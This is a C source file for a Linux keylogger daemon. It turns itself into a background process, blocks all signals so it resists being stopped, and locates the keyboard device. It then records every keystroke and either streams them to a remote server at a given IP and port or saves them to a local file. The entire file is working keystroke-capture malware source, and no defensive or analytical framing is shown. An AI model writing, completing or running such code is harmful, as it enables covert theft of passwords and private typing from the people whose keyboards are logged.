/**Developed by Fabio Cinicolo **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include "daemon.h"
#include "keylogger.h"

#define SOCKET 1
#define FILE 2

int blockAllSignals();
int unblockSignal(int signum);

int main(int argc, char *argv[])
{
    int fd, keyboard, flock, file_out_type;
    int is_single_instance;

    if (argc != 4 && argc != 3)
        fprintf(stderr, "Usage: ./keylogger-daemon ip port [0|1] OR ./keylogger-daemon filename [0|1]\n"), exit(EXIT_FAILURE);

    if (!daemonize("keylogger-daemon")) /* Convert process to daemon */
        syslog(LOG_ERR, "Couldn't daemonize process"), exit(EXIT_FAILURE);

    is_single_instance = argc == 4 ? atoi(argv[3]) : atoi(argv[2]);

    if (is_single_instance)
        if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running or lockfile() failed for another reason, daemon terminates */
           syslog(LOG_ERR, "An instance of the keylogger is already running or lockfile() failed, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);

    if (!blockAllSignals()) /* Blocking all signals */
        syslog(LOG_ERR, "Couldn't set signal bitmask, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);

    if ((keyboard = findKeyboardDevice(PATH)) < 0) /* Looking for Keyboard device driver */
        syslog(LOG_ERR, "Couldn't find keyboard device, quitting.."), exit(EXIT_FAILURE);

    file_out_type = argc == 4 ? SOCKET : FILE;

    if (file_out_type == SOCKET) /* If user decided to send events to server */
    {
        char *ip = argv[1];
        short port = atoi(argv[2]);
        if ((fd = openConnectionWithServer(ip, port)) < 0) /* Connecting with server */
            syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
        if(!unblockSignal(SIGPIPE))/* If server closes connection and keylogger tries to send events, SIGPIPE is generated */
            syslog(LOG_ERR, "Couldn't unblock SIGPIPE, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
    }
    else if (file_out_type == FILE) /* If user decided to save events locally */
    {
        char *file_out_path = argv[1];
        if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH)) < 0)
            syslog(LOG_ERR, "Couldn't open file %s, quitting.. [%s]", argv[2], strerror(errno)), exit(EXIT_FAILURE);
        if(!unblockSignal(SIGTERM)) /* We can safely terminate daemon only by sending SIGTERM */
            syslog(LOG_ERR, "Couldn't unblock SIGTERM, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
    }

    startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to file */

    syslog(LOG_INFO, "**Daemon safely terminated**");
    close(flock); /* Closing daemon's lock file */
    exit(EXIT_SUCCESS);
}

int blockAllSignals()
{
    sigset_t signal_set;
    sigfillset(&signal_set);
    return sigprocmask(SIG_SETMASK, &signal_set, NULL) < 0 ? 0 : 1;
}

int unblockSignal(int signum)
{

    sigset_t signal_set;
    sigemptyset(&signal_set);
    sigaddset(&signal_set, signum);
    return sigprocmask(SIG_UNBLOCK, &signal_set, NULL) < 0 ? 0 : 1;
}
